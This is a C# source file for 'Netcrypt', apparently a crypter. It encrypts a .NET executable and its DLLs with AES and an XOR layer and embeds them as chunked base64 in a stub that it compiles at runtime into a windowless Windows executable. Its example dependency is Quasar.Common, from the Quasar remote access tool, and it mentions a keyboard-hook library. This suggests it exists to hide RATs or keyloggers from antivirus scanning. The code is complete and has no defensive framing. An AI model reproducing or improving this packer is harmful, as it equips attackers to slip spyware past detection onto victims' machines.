using System;
using System.Text;
using Microsoft.CSharp;
using System.IO;
using System.Security.Cryptography;
using System.Reflection;
using System.CodeDom.Compiler;
using System.Collections.Generic;

namespace Netcrypt
{
    /// <summary>
    /// Used to choose the .NET version used to pack the executable.
    /// </summary>
    public enum DotNetVersion
    {
        /// <summary>
        /// Use .NET 2.0 target
        /// </summary>
        v2_0,
        /// <summary>
        /// Use .NET 3.5 target
        /// </summary>
        v3_5,

        /// <summary>
        /// Use .NET 4.0 target
        /// </summary>
        v4_0

    }

    /// <summary>
    /// Provides an easy-to-use interface to a software packing algorythm for .NET executables.
    /// </summary>
    public class Packer
    {
        /// <summary>
        /// Packs the provided assembly using .NET 3.5 by default.
        /// </summary>
        /// <param name="assembly">A byte[] array containing the original assemly</param>
        /// <returns>a byte[] array containing the packed assembly</returns>
        ///
        public static byte[] Pack(byte[] assembly)
        {
            return Pack(assembly, DotNetVersion.v3_5);
        }

        /// <summary>
        /// Packs the provided assembly using the chosen .NET framework.
        /// </summary>
        /// <param name="assembly">A byte[] array containing the original assemly</param>
        /// <param name="version">The version of the .NET framework used.</param>
        /// <returns>a byte[] array containing the packed assembly</returns>
        public static byte[] Pack(byte[] assembly, DotNetVersion version)
        {
            return Pack(assembly, null, null, version);
        }

        /// <summary>
        /// Packs the provided assembly together with its dependency DLLs.
        /// </summary>
        /// <param name="assembly">A byte[] array containing the original assemly</param>
        /// <param name="dependencyNames">Simple assembly names of the dependencies (e.g. "Quasar.Common")</param>
        /// <param name="dependencyBytes">Raw DLL bytes, one per dependency name</param>
        /// <param name="version">The version of the .NET framework used.</param>
        /// <returns>a byte[] array containing the packed assembly</returns>
        public static byte[] Pack(byte[] assembly, string[] dependencyNames, byte[][] dependencyBytes, DotNetVersion version)
        {
            // ---- build payload container ---------------------------------
            // format:
            //   Int32 magic (0x4E435434)
            //   Int32 payload size (excluding magic and size fields)
            //   Int32 count
            //   for each dependency:
            //     String name (BinaryWriter 7-bit length prefix)
            //     Byte[] data (Int32 length prefix)
            //   Byte[] main assembly (Int32 length prefix)
            byte[] payload;
            using (MemoryStream payloadStream = new MemoryStream())
            {
                using (BinaryWriter bw = new BinaryWriter(payloadStream))
                {
                    bw.Write(0x4E435434); // magic "NCT4"
                    bw.Write(0);          // size placeholder (patched below)
                    if (dependencyNames == null)
                    {
                        bw.Write(0);
                    }
                    else
                    {
                        bw.Write(dependencyNames.Length);
                        for (int i = 0; i < dependencyNames.Length; i++)
                        {
                            bw.Write(dependencyNames[i]);
                            // explicit length + raw bytes: BinaryWriter.Write(byte[])
                            // length-prefix behavior differs across runtimes
                            bw.Write((int)dependencyBytes[i].Length);
                            bw.Write(dependencyBytes[i], 0, dependencyBytes[i].Length);
                        }
                    }
                    bw.Write((int)assembly.Length);
                    bw.Write(assembly, 0, assembly.Length);
                    long payloadEnd = payloadStream.Position;
                    payloadStream.Seek(4, SeekOrigin.Begin);
                    bw.Write((int)(payloadEnd - 8));
                }
                payload = payloadStream.ToArray();
            }

            VerifyContainer(payload, dependencyNames, dependencyBytes, assembly);

            // ---- AES (Rijndael) layer ------------------------------------
            RijndaelManaged rijndael = new RijndaelManaged();
            rijndael.KeySize = 256;
            rijndael.GenerateIV();
            rijndael.GenerateKey();
            rijndael.Padding = PaddingMode.ISO10126;

            string key = Convert.ToBase64String(rijndael.Key);
            string iv = Convert.ToBase64String(rijndael.IV);

            // ---- XOR layer (extra transform applied to the encrypted payload) ----
            byte[] xorKey = new byte[32];
            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                rng.GetBytes(xorKey);
            }
            string xorKeyValue = Convert.ToBase64String(xorKey);

            byte[] encrypted;
            using (MemoryStream memoryStream = new MemoryStream())
            {
                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndael.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    cryptoStream.Write(payload, 0, payload.Length);
                    cryptoStream.FlushFinalBlock();
                }
                encrypted = memoryStream.ToArray();
            }

            byte[] xored = new byte[encrypted.Length];
            for (int i = 0; i < encrypted.Length; i++)
            {
                xored[i] = (byte)(encrypted[i] ^ xorKey[i % xorKey.Length]);
            }

            string app = Convert.ToBase64String(xored);

            // split the base64 payload into chunks so the generated stub never
            // contains one giant string literal (compiler truncation risk)
            int chunkSize = 60000;
            StringBuilder chunkSource = new StringBuilder();
            for (int i = 0; i < app.Length; i += chunkSize)
            {
                if (i > 0)
                {
                    chunkSource.AppendLine(",");
                }
                int len = Math.Min(chunkSize, app.Length - i);
                chunkSource.Append("\"");
                chunkSource.Append(app.Substring(i, len));
                chunkSource.Append("\"");
            }
            string chunkValue = chunkSource.ToString();

            string csharpcode = netcrypt.Properties.Resources.StubCode;

            if (csharpcode.Contains("&lt;") || csharpcode.Contains("&gt;") ||
                csharpcode.Contains("&amp;") || csharpcode.Contains("&quot;") ||
                csharpcode.Contains("&apos;"))
            {
                throw new Exception("Stub resource contains XML entities that were not decoded (resx double-escaped). Re-apply StubCode to Resources.resx using StubCode-resx.txt.");
            }

            csharpcode = csharpcode.Replace("%XORKEY%", xorKeyValue);
            csharpcode = csharpcode.Replace("%KEY%", key);
            csharpcode = csharpcode.Replace("%IV%", iv);
            csharpcode = csharpcode.Replace("%CHUNKS%", chunkValue);

            var providerOptions = new Dictionary<string, string>();

            switch (version)
            {
                case DotNetVersion.v4_0:
                    providerOptions.Add("CompilerVersion", "v4.0");
                    break;
                case DotNetVersion.v3_5:
                    providerOptions.Add("CompilerVersion", "v3.5");
                    break;
                case DotNetVersion.v2_0:
                default:
                    providerOptions.Add("CompilerVersion", "v4.0");
                    break;
            }

            CSharpCodeProvider codeProvider = new CSharpCodeProvider(providerOptions);



            CompilerParameters parameters = new CompilerParameters();

            parameters.CompilerOptions = "/target:winexe";

            // The stub is self-contained; it only needs System.Windows.Forms for MessageBox.
            // Do not mirror the target's references: third-party assemblies such as
            // Gma.System.MouseKeyHook are not resolvable by the stub compiler (CS0006).
            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Core.dll");
            parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");

            string tempFile = System.IO.Path.GetTempPath() + Guid.NewGuid().ToString() + ".exe";

            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = tempFile;

            CompilerResults results = codeProvider.CompileAssemblyFromSource(parameters, csharpcode);

            // ---- diagnostic: surface stub compile errors instead of hiding them ----
            if (results.Errors.HasErrors)
            {
                StringBuilder sb = new StringBuilder();
                sb.AppendLine("Stub compile failed:");
                foreach (CompilerError err in results.Errors)
                {
                    sb.AppendLine(err.ToString());
                }
                throw new Exception(sb.ToString());
            }
            if (results.CompiledAssembly == null)
            {
                throw new Exception("Stub compile returned no assembly.");
            }

            try {
                FileStream fs = results.CompiledAssembly.GetFiles()[0];
                byte[] barr  = new byte[fs.Length];
                int r = fs.Read(barr, 0, barr.Length);
                fs.Close();
                string fileName = fs.Name;
                fs.Dispose();

                if (r == barr.Length)
                {
                    return barr;
                }
                else
                {
                    return null;
                }
            } catch (Exception ex2) {
                throw new Exception("Failed to read compiled stub output: " + ex2.Message, ex2);
            }

        }

        private static void VerifyContainer(byte[] payload, string[] dependencyNames, byte[][] dependencyBytes, byte[] assembly)
        {
            using (MemoryStream ms = new MemoryStream(payload))
            using (BinaryReader reader = new BinaryReader(ms))
            {
                int magic = reader.ReadInt32();
                int size = reader.ReadInt32();
                int count = reader.ReadInt32();
                int expectedCount = (dependencyNames == null) ? 0 : dependencyNames.Length;
                if (magic != 0x4E435434 || size != payload.Length - 8 || count != expectedCount)
                {
                    throw new Exception("Container verification failed at header (magic=0x" + magic.ToString("X8") + ", size=" + size + ", count=" + count + ").");
                }
                for (int i = 0; i < count; i++)
                {
                    string name = reader.ReadString();
                    int len = reader.ReadInt32();
                    byte[] data = reader.ReadBytes(len);
                    if (name != dependencyNames[i] || len != dependencyBytes[i].Length || data.Length != dependencyBytes[i].Length)
                    {
                        throw new Exception("Container verification failed at dependency " + i + " (name=" + name + ", len=" + len + ", read=" + data.Length + ").");
                    }
                }
                int mainLen = reader.ReadInt32();
                byte[] main = reader.ReadBytes(mainLen);
                if (mainLen != assembly.Length || main.Length != assembly.Length)
                {
                    throw new Exception("Container verification failed at main assembly (len=" + mainLen + ", read=" + main.Length + ", expected=" + assembly.Length + ").");
                }
            }
        }
    }
}
